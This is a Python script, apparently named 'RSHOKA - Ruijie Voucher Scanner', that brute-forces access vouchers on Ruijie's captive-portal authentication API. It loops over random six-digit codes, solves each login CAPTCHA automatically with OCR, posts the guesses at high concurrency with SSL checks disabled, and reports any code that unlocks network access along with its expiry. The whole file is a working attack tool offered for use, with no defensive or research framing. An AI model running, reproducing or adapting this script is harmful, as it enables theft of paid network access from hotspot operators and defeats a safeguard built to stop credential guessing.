import asyncio, aiohttp, random, string, time, cv2, ddddocr, numpy as np, re, json, base64
from rich.console import Console
from rich.panel import Panel
from rich.live import Live
from rich.table import Table
from rich.prompt import Prompt

# --- Configuration ---
console = Console()
_ocr = ddddocr.DdddOcr(show_ad=False)
CONCURRENCY = 600
_voucher_sem = asyncio.Semaphore(CONCURRENCY)
_connector = aiohttp.TCPConnector(limit=2000, ssl=False)

def show_banner():
    console.print(Panel("[bold cyan]RSHOKA - Ruijie Voucher Scanner[/bold cyan]", expand=False))

def generate_table(checked, success_count, speed, last_hit):
    table = Table(title="Scanner Live Status")
    table.add_column("Metrics", style="cyan")
    table.add_column("Value", style="magenta")
    table.add_row("Checked", f"{checked:,}")
    table.add_row("Success", f"[bold green]{success_count:,}[/bold green]")
    table.add_row("Speed", f"{speed:,.0f} codes/min")
    table.add_row("Last Hit", f"[yellow]{last_hit}[/yellow]")
    return table

# --- Logic Functions (From original boot.py) ---
async def get_session_id(session, session_url):
    try:
        async with session.get(session_url, allow_redirects=True) as req:
            response = str(req.url)
            match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            return match.group(1) if match else None
    except: return None

async def solve_captcha(session, session_id):
    try:
        async with session.get(f'https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={session_id}&_t={time.time()}') as req:
            img = await req.read()
            return _ocr.classification(img).upper()
    except: return None

async def perform_check(session, session_id, code):
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    auth_code = await solve_captcha(session, session_id)
    if not auth_code: return {"status": False}
    
    data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
    try:
        async with session.post(post_url, json=data) as req:
            resp_text = await req.text()
            if 'logonUrl' in resp_text:
                # ဤနေရာတွင် expiry_date ကို response ထဲက ဆွဲထုတ်ပါ
                resp_json = json.loads(resp_text)
                expiry = resp_json.get("expiry_date", "N/A")
                return {"status": True, "expiry": expiry}
    except: pass
    return {"status": False}

# --- Main Running Loop ---
async def main():
    console.clear()
    show_banner()
    session_url = Prompt.ask("[bold yellow]Enter Session URL[/bold yellow]")
    
    checked = 0
    success_count = 0
    last_hit = "None"
    start_time = time.monotonic()
    
    async with aiohttp.ClientSession(connector=_connector) as session:
        session_id = await get_session_id(session, session_url)
        if not session_id:
            console.print("[bold red]Failed to get Session ID![/bold red]")
            return

        with Live(generate_table(0, 0, 0, "None"), refresh_per_second=2) as live:
            while True:
                code = "".join(random.choices(string.digits, k=6))
                
                # Check voucher
                res = await perform_check(session, session_id, code)
                
                checked += 1
                if res["status"]:
                    success_count += 1
                    last_hit = f"{code} (Exp: {res['expiry']})"
                    console.print(f"\n[bold green]✔ SUCCESS: {code} | Expiry: {res['expiry']}[/bold green]")
                
                elapsed = time.monotonic() - start_time
                speed = (checked / elapsed * 60) if elapsed > 0 else 0
                live.update(generate_table(checked, success_count, speed, last_hit))
                await asyncio.sleep(0.01)

if __name__ == '__main__':
    try: asyncio.run(main())
    except KeyboardInterrupt: console.print("\n[bold red]Stopped.[/bold red]")
